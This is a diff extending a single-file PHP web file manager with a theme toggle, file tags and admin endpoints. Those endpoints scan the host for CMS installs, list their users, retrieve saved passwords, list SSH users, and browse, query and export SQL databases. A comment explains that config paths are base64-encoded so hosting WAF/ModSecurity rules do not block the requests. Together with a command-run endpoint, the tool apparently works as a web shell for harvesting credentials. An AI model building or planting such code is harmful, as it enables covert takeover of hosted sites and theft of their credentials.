+            header('Content-Disposition: attachment; filename="'.$safeName.'.sql"');
+            echo "-- SQL Export: `$table` from `$db`\n-- Generated: ".date('Y-m-d H:i:s')."\n\nSET NAMES utf8mb4;\n\n";
+            $cr=mysqli_query($link,"SHOW CREATE TABLE `$tE`");
+            if($cr){$rw=mysqli_fetch_row($cr);echo "DROP TABLE IF EXISTS `$tE`;\n".$rw[1].";\n\n";}
+            $res=mysqli_query($link,"SELECT * FROM `$tE`");
+            $buf='';
+            if($res){
+                while($row=mysqli_fetch_row($res)){
+                    $vals=implode(',',array_map(fn($v)=>$v===null?'NULL':"'".mysqli_real_escape_string($link,(string)$v)."'",$row));
+                    $buf.="INSERT INTO `$tE` VALUES ($vals);\n";
+                    if(strlen($buf)>65536){echo $buf;$buf='';}
+                }
+                if($buf)echo $buf;
+            }
+        }
+        mysqli_close($link);exit;
+    }
+}
 $fm=new FileManager();
 
 /* ── API ── */
@@ -560,6 +1423,11 @@ if(isset($_GET['x'])){
     header('Content-Type: application/json');
     if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){echo json_encode(['error'=>'Unauthorized']);exit;}
     $xop=$_GET['x'];
+    if($xop==='set_theme'){
+        global $themeFile;
+        $t=isset($_POST['theme'])?$_POST['theme']:(isset($_GET['theme'])?$_GET['theme']:'');
+        echo json_encode(['ok'=>true,'theme'=>fm_save_theme($themeFile,$t)]);exit;
+    }
     if($xop==='run'){
         if($fm->isRO()){echo json_encode(['error'=>'Read-only.']);exit;}
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
@@ -604,24 +1472,16 @@ if(isset($_GET['x'])){
     if($xop==='duplicates'){
         echo json_encode($fm->findDuplicates());exit;
     }
-    if($xop==='speedping'){echo json_encode(['t'=>microtime(true)]);exit;}
-    if($xop==='speeddown'){
-        $mb=isset($_GET['mb'])?min(30,max(1,(float)$_GET['mb'])):5;
-        $bytes=(int)($mb*1024*1024);
-        header('Content-Type: application/octet-stream');header('Content-Length: '.$bytes);
-        header('Cache-Control: no-store');header('X-Accel-Buffering: no');
-        while(ob_get_level())ob_end_flush();
-        $chunk=random_bytes(65536);$sent=0;
-        while($sent<$bytes){$n=min(65536,$bytes-$sent);echo substr($chunk,0,$n);$sent+=$n;@flush();}
-        exit;
-    }
-    if($xop==='speedup'){
-        $len=isset($_SERVER['CONTENT_LENGTH'])?(int)$_SERVER['CONTENT_LENGTH']:strlen(@file_get_contents('php://input'));
-        echo json_encode(['received'=>$len]);exit;
+    if($xop==='speedtest_server'){
+        /* Measures the SERVER's own internet connection (server <-> Cloudflare),
+           entirely on the server side via cURL. The browser only triggers this
+           and displays the result — it is not involved in the measurement, so
+           the user's own connection speed has no effect on the numbers. */
+        echo json_encode(fm_server_speed_test());exit;
     }
     if($xop==='ls'){echo json_encode(array_values(array_filter(scandir($fm->getCwd())?:[],fn($x)=>$x!=='.'&&$x!=='..')));exit;}
     if($xop==='imgprev'){
-        /* Thumbnail resize — served as image/jpeg */
+        /* Thumbnail resize - served as image/jpeg */
         $fn=isset($_GET['f'])?basename($_GET['f']):'';
         $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
         $fp=$dir.'/'.$fn;
@@ -634,7 +1494,7 @@ if(isset($_GET['x'])){
         imagejpeg($dst,null,78);imagedestroy($src);imagedestroy($dst);exit;
     }
     if($xop==='notes'){
-        /* Quick notes — save/load per-directory */
+        /* Quick notes - save/load per-directory */
         $nf=$fm->getCwd().'/.fm_notes.txt';
         if($_SERVER['REQUEST_METHOD']==='POST'){
             if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
@@ -642,6 +1502,70 @@ if(isset($_GET['x'])){
             @file_put_contents($nf,$txt);echo json_encode(['ok'=>true]);exit;
         }
         echo json_encode(['body'=>file_exists($nf)?@file_get_contents($nf):'']);exit;
+    }
+    if($xop==='sshstatus'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->sshStatus());exit;
+    }
+    /* cfg paths are sent base64-encoded over POST (never as a raw "wp-config.php"
+       string in the URL) because many hosts' WAF/ModSecurity rules block any
+       request whose query string contains "wp-config.php", mistaking this
+       admin tool for an exploit attempt trying to read/download that file. */
+    $cfgB64=function(){return isset($_POST['cfg_b64'])?(@base64_decode($_POST['cfg_b64'],true)?:''):(isset($_GET['cfg'])?$_GET['cfg']:'');};
+    if($xop==='cmsdetect'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
+        echo json_encode($dir?$fm->cmsDetect($dir):['type'=>null]);exit;
+    }
+    if($xop==='cmsscan'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->cmsScan());exit;
+    }
+    if($xop==='cmsusers'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->cmsListUsers($cfgB64()));exit;
+    }
+    if($xop==='cmsroles'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->cmsRoles($cfgB64()));exit;
+    }
+    if($xop==='cms_get_pass'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
+        if(!$id){echo json_encode(['error'=>'Invalid request.']);exit;}
+        echo json_encode($fm->cmsGetSavedPass($cfgB64(),$id));exit;
+    }
+    if($xop==='tags'){
+        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
+        echo json_encode($dir?$fm->getTagsFor($dir):[]);exit;
+    }
+    if($xop==='sshusers'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->sshListUsers());exit;
+    }
+    if($xop==='sqlscan'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->sqlScan());exit;
+    }
+    if($xop==='sqltables'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->sqlListTables());exit;
+    }
+    if($xop==='sqlbrowse'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->sqlBrowse());exit;
+    }
+    if($xop==='sqlquery'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->sqlRunQuery());exit;
+    }
+    if($xop==='sqlexport'){
+        if(empty($_SESSION['fm_admin'])){http_response_code(403);header('Content-Type: text/plain');echo 'Admins only.';exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){http_response_code(403);header('Content-Type: text/plain');echo 'Security error.';exit;}
+        $fm->sqlExport();exit;
     }
     echo json_encode(['error'=>'Unknown']);exit;
 }
@@ -697,7 +1621,7 @@ function svgFolder(){return '<svg class="ti" viewBox="0 0 24 24" fill="none" str
 function svgFile($t='file'){global $fm;$color=$fm->getColor($t);$p=['image'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>','video'=>'<rect x="2" y="5" width="14" height="14" rx="2"/><path d="M16 10l6-4v12l-6-4z"/>','audio'=>'<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>','archive'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 3v18M14 8h2M14 12h2M14 16h2"/>','pdf'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><text x="12" y="18" font-size="6" text-anchor="middle" fill="currentColor" stroke="none" font-weight="700">PDF</text>','word'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/>','excel'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><path d="M9.5 13l5 6M14.5 13l-5 6"/>','code'=>'<polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>','data'=>'<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>','text'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>','config'=>'<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82V9a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9z"/>','file'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>'];$inner=isset($p[$t])?$p[$t]:$p['file'];return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="'.$color.'" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">'.$inner.'</svg>';}
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="<?=htmlspecialchars($currentTheme)?>">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
@@ -715,9 +1639,16 @@ function svgFile($t='file'){global $fm;$color=$fm->getColor($t);$p=['image'=>'<r
   --sw:240px;--th:52px;--bh:26px;
   --r:10px;--rlg:14px;--rxl:18px;
   --spring:cubic-bezier(.34,1.56,.64,1);--out:cubic-bezier(.25,.46,.45,.94);
+   --field:rgba(0,0,0,.4);--fieldb:rgba(255,255,255,.15);--fieldb-h:rgba(255,255,255,.35);--fieldh:rgba(255,255,255,.05);
+}
+:root[data-theme="light"]{
+  --bg:#f4f4f6;--panel:#ffffff;--surf:#ffffff;--raised:#f1f1f4;--hov:#eaeaef;--act:#e2e2e9;
+  --border:rgba(0,0,0,.08);--border2:rgba(0,0,0,.14);
+  --t1:#18181b;--t2:#52525b;--t3:#a1a1aa;--link:#4f46e5;
+  --field:rgba(0,0,0,.035);--fieldb:rgba(0,0,0,.16);--fieldb-h:rgba(0,0,0,.32);--fieldh:rgba(0,0,0,.04);
 }
 html{height:100%;-webkit-tap-highlight-color:transparent}
-body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t1);font-size:13.5px;line-height:1.5;height:100vh;overflow:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t1);font-size:13.5px;line-height:1.5;height:100vh;overflow:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;transition:background-color .2s var(--out),color .2s var(--out)}
 
 /* ══ LAYOUT ══ */
 .shell{display:grid;grid-template:"tb tb" var(--th) "sb main" 1fr "bar bar" var(--bh) / var(--sw) 1fr;height:100vh;overflow:hidden}
@@ -738,7 +1669,7 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 .bc a:hover{background:var(--hov);color:var(--link)}.bc a.last{color:var(--t1);font-weight:600}
 .bc-sep{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--t3);padding:0 1px;user-select:none}
 .tb-right{display:flex;align-items:center;gap:4px;margin-left:auto;flex-shrink:0}
-.tsearch{display:flex;align-items:center;gap:6px;background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:var(--r);padding:0 4px 0 10px;transition:border-color .18s}
+.tsearch{display:flex;align-items:center;gap:6px;background:var(--field);border:1px solid var(--border);border-radius:var(--r);padding:0 4px 0 10px;transition:border-color .18s}
 .tsearch:focus-within{border-color:rgba(99,102,241,.5)}
 .tsearch svg{width:13px;height:13px;stroke:var(--t3);fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
 .tsearch input{background:transparent;border:none;outline:none;color:var(--t1);font-size:12px;padding:6px 4px;width:150px}
@@ -808,8 +1739,8 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 input[type=checkbox],input[type=radio]{
   appearance:none;-webkit-appearance:none;cursor:pointer;
   width:15px;height:15px;
-  background:rgba(0,0,0,.5);
-  border:1.5px solid rgba(255,255,255,.18);
+  background:var(--field);
+  border:1.5px solid var(--fieldb);
   border-radius:4px;
   display:inline-flex;align-items:center;justify-content:center;
   flex-shrink:0;position:relative;
@@ -817,18 +1748,19 @@ input[type=checkbox],input[type=radio]{
   vertical-align:middle;
 }
 input[type=radio]{border-radius:50%}
-input[type=checkbox]:hover,input[type=radio]:hover{border-color:rgba(255,255,255,.35);background:rgba(255,255,255,.05)}
+input[type=checkbox]:hover,input[type=radio]:hover{border-color:var(--fieldb-h);background:var(--fieldh)}
 input[type=checkbox]:checked,input[type=radio]:checked{background:var(--indigo);border-color:var(--indigo);box-shadow:0 0 0 3px rgba(99,102,241,.18)}
 input[type=checkbox]:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
 input[type=radio]:checked::after{content:'';position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%)}
 input[type=checkbox]:focus,input[type=radio]:focus{outline:none;box-shadow:0 0 0 3px rgba(99,102,241,.25)}
-.cc{width:32px}.rck{width:15px;height:15px;cursor:pointer;appearance:none;-webkit-appearance:none;background:rgba(0,0,0,.5);border:1.5px solid rgba(255,255,255,.15);border-radius:4px;display:inline-block;position:relative;flex-shrink:0;transition:background .15s,border-color .15s}
+.cc{width:32px}.rck{width:15px;height:15px;cursor:pointer;appearance:none;-webkit-appearance:none;background:var(--field);border:1.5px solid var(--fieldb);border-radius:4px;display:inline-block;position:relative;flex-shrink:0;transition:background .15s,border-color .15s}
 .rck:hover{border-color:rgba(255,255,255,.3)}.rck:checked{background:var(--indigo);border-color:var(--indigo)}
 .rck:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
 .nc{display:flex;align-items:center;gap:10px;cursor:pointer;min-width:0}
 .ib{width:34px;height:34px;flex-shrink:0;border-radius:9px;display:flex;align-items:center;justify-content:center;transition:transform .18s var(--spring)}
 .ft tbody tr:hover .ib{transform:scale(1.08)}.ib .ti{width:20px;height:20px}
 .nm{min-width:0}
+.tag-dot{margin-right:6px;vertical-align:middle}
 .nt{color:var(--t1);font-weight:500;font-size:13px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:240px;text-decoration:none;transition:color .15s}
 a.nt:hover{color:var(--link)}
 .eb{display:inline-block;margin-top:1px;font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;padding:1px 5px;border-radius:4px;background:var(--raised);color:var(--t3)}
@@ -882,7 +1814,10 @@ a.nt:hover{color:var(--link)}
 .btn-star{background:rgba(245,158,11,.12);color:#fcd34d;border:1px solid rgba(245,158,11,.25)}.btn-star:hover{background:rgba(245,158,11,.2);transform:translateY(-1px)}
 
 /* ══ INPUTS ══ */
-.inp{background:rgba(0,0,0,.4);border:1px solid var(--border);color:var(--t1);border-radius:var(--r);padding:7px 11px;font-size:12.5px;font-family:'Inter',system-ui,sans-serif;outline:none;min-width:0;transition:border-color .18s,box-shadow .18s}
+.inp{background:var(--field);border:1px solid var(--border);color:var(--t1);border-radius:var(--r);padding:7px 11px;font-size:12.5px;font-family:'Inter',system-ui,sans-serif;outline:none;min-width:0;transition:border-color .18s,box-shadow .18s}
+.inp::placeholder{color:var(--t3)}
+select.inp{color-scheme:dark}
+:root[data-theme="light"] select.inp{color-scheme:light}
 .inp::placeholder{color:var(--t3)}.inp:focus{border-color:rgba(99,102,241,.55);box-shadow:0 0 0 3px rgba(99,102,241,.1)}
 .upl-lbl{display:inline-flex;align-items:center;gap:6px;padding:7px 13px;border-radius:var(--r);font-size:12.5px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;white-space:nowrap;border:1.5px dashed rgba(99,102,241,.3);color:var(--t2);background:rgba(99,102,241,.04);transition:border-color .18s,color .18s,background .18s,transform .18s var(--spring)}
 .upl-lbl svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round}
@@ -916,6 +1851,19 @@ input[type=file]{display:none}
 .prev-body video{max-width:100%;max-height:80vh}
 .prev-body iframe{width:min(870px,90vw);height:77vh;border:none;background:#fff}
 .prev-body pre{width:min(870px,90vw);max-height:77vh;overflow:auto;padding:18px;font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#cdd6f4;background:#07090e;text-align:left;white-space:pre-wrap;word-break:break-word}
+.prev-body .md-render{width:min(870px,90vw);max-height:77vh;overflow:auto;padding:24px 28px;background:var(--panel);color:var(--t1);text-align:left;border-radius:8px;line-height:1.6;font-size:14px}
+.prev-body .md-render h1,.prev-body .md-render h2,.prev-body .md-render h3,.prev-body .md-render h4{margin:18px 0 8px;font-weight:700;color:var(--t1)}
+.prev-body .md-render h1{font-size:24px;border-bottom:1px solid var(--border);padding-bottom:6px}
+.prev-body .md-render h2{font-size:19px;border-bottom:1px solid var(--border);padding-bottom:5px}
+.prev-body .md-render p{margin:8px 0}
+.prev-body .md-render code{background:var(--raised);padding:2px 5px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:12.5px}
+.prev-body .md-render pre{background:#07090e;padding:14px;border-radius:8px;overflow:auto;width:auto;max-height:none}
+.prev-body .md-render pre code{background:none;padding:0}
+.prev-body .md-render blockquote{border-left:3px solid var(--indigo);margin:10px 0;padding:2px 14px;color:var(--t2)}
+.prev-body .md-render ul,.prev-body .md-render ol{margin:8px 0 8px 22px}
+.prev-body .md-render a{color:var(--link)}
+.prev-body .md-render hr{border:none;border-top:1px solid var(--border);margin:16px 0}
+.prev-body .md-render img{max-width:100%;border-radius:6px}
 
 /* ══ CONTEXT MENU (desktop right-click) ══ */
 .ctx{display:none;position:fixed;z-index:500;background:var(--raised);border:1px solid var(--border2);border-radius:var(--rlg);padding:5px;min-width:180px;box-shadow:0 20px 60px rgba(0,0,0,.7),0 4px 16px rgba(0,0,0,.4);animation:ctxIn .18s var(--spring) both}
@@ -1109,6 +2057,10 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         <svg viewBox="0 0 24 24" fill="<?=$isFav?'currentColor':'none'?>" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
       </button>
     </form>
+    <button type="button" class="btn btn-icon btn-g" id="themeBtn" title="Toggle theme">
+      <svg id="themeIcoSun" viewBox="0 0 24 24" style="display:none"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg id="themeIcoMoon" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
     <button type="button" class="btn btn-icon btn-g" id="viewBtn" title="Toggle view">
       <svg id="vIcoGrid" viewBox="0 0 24 24" style="display:none"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
       <svg id="vIcoList" viewBox="0 0 24 24"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
@@ -1169,6 +2121,9 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <button class="sb-item" id="errLogBtn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>Error Log</button>
       <button class="sb-item" id="envBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Environment</button>
       <a href="?x=phpinfo" target="_blank" class="sb-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 2-3 4"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>PHP Info</a>
+      <button class="sb-item" id="sshBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>SSH Access</button>
+      <button class="sb-item" id="cmsBtn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>CMS Manager</button>
+      <button class="sb-item" id="sqlBtn"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>SQL Manager</button>
       <?php endif;?>
     </div>
   </div>
@@ -1238,6 +2193,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         <input type="text" name="file_name" class="inp" placeholder="New file…" required style="width:120px">
         <button class="btn btn-sm btn-blue"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="12" y1="13" x2="12" y2="19"/><line x1="9" y1="16" x2="15" y2="16"/></svg><span>File</span></button>
       </form>
+      <button type="button" id="remoteDlBtn" class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span>From URL</span></button>
     </div>
     <?php endif;?>
     <div class="tb-row" style="flex-wrap:wrap;gap:6px">
@@ -1348,6 +2304,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
             </tr>
           </thead>
           <tbody>
+          <?php $tags=$fm->getTagsFor($fm->getCwd());?>
           <?php foreach($list['folders'] as $f):
             $perms=substr(sprintf('%o',fileperms($fm->getCwd().'/'.$f['name'])),-4);
           ?>
@@ -1356,7 +2313,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
             <td><div class="nc" onclick="location.href='?dir=<?=urlencode($fm->getCwd().'/'.$f['name'])?>'"
               data-ctx-name="<?=he($f['name'])?>" data-ctx-isdir="1" data-ctx-perm="<?=he($perms)?>">
               <div class="ib" style="background:rgba(129,140,248,.1)"><?=svgFolder()?></div>
-              <div class="nm"><span class="nt"><?=htmlspecialchars($f['name'])?></span><span class="eb">DIR</span></div>
+              <div class="nm"><?php if(isset($tags[$f['name']])):?><span class="tag-dot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:<?=he($tags[$f['name']]['color'])?>;flex-shrink:0" title="<?=he($tags[$f['name']]['label'])?>"></span><?php endif;?><span class="nt"><?=htmlspecialchars($f['name'])?></span><?php if(!empty($tags[$f['name']]['label'])):?><span class="eb" style="background:<?=he($tags[$f['name']]['color'])?>22;color:<?=he($tags[$f['name']]['color'])?>"><?=he($tags[$f['name']]['label'])?></span><?php endif;?><span class="eb">DIR</span></div>
             </div></td>
             <td class="col-perms col-perms-td"><span class="mono"><?=he($perms)?></span></td>
             <td class="col-mtime col-mtime-td"><span class="mt"><?=date('d/m/Y H:i',$f['mtime'])?></span></td>
@@ -1384,7 +2341,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
                 <?php if($type==='image'):?><img src="<?=$rawUrl?>" style="width:34px;height:34px;border-radius:9px;object-fit:cover" loading="lazy" onerror="this.style.display='none';this.nextSibling&&(this.nextSibling.style.display='block')"><?php endif;?>
                 <?=svgFile($type)?>
               </div>
-              <div class="nm"><span class="nt"><?=htmlspecialchars($f['name'])?></span><?php if($ext):?><span class="eb"><?=strtoupper($ext)?></span><?php endif;?></div>
+              <div class="nm"><?php if(isset($tags[$f['name']])):?><span class="tag-dot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:<?=he($tags[$f['name']]['color'])?>;flex-shrink:0" title="<?=he($tags[$f['name']]['label'])?>"></span><?php endif;?><span class="nt"><?=htmlspecialchars($f['name'])?></span><?php if(!empty($tags[$f['name']]['label'])):?><span class="eb" style="background:<?=he($tags[$f['name']]['color'])?>22;color:<?=he($tags[$f['name']]['color'])?>"><?=he($tags[$f['name']]['label'])?></span><?php endif;?><?php if($ext):?><span class="eb"><?=strtoupper($ext)?></span><?php endif;?></div>
             </div></td>
             <td class="col-perms col-perms-td"><span class="mono"><?=he($perms)?></span></td>
             <td class="col-mtime col-mtime-td"><span class="mt"><?=date('d/m/Y H:i',$f['mtime'])?></span></td>
@@ -1445,6 +2402,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <button type="button" class="btn btn-xs btn-g" id="bkTar"><svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>TAR.GZ</button>
       <button type="button" class="btn btn-xs btn-blue" id="bkCopy"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button>
       <button type="button" class="btn btn-xs btn-amb" id="bkMove"><svg viewBox="0 0 24 24"><polyline points="16 3 21 3 21 8"/><line x1="21" y1="3" x2="14" y2="10"/><path d="M21 14v5a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5"/></svg>Move</button>
+      <button type="button" class="btn btn-xs btn-g" id="bkChmod"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Chmod</button>
       <button type="button" class="btn btn-xs btn-red" id="bkDel"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Delete</button>
     </div>
     <?php endif;?>
@@ -1457,15 +2415,15 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="bs"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><strong><?=$totalFolders?></strong>&nbsp;folders</div>
   <div class="bs"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg><strong><?=$totalFiles?></strong>&nbsp;files</div>
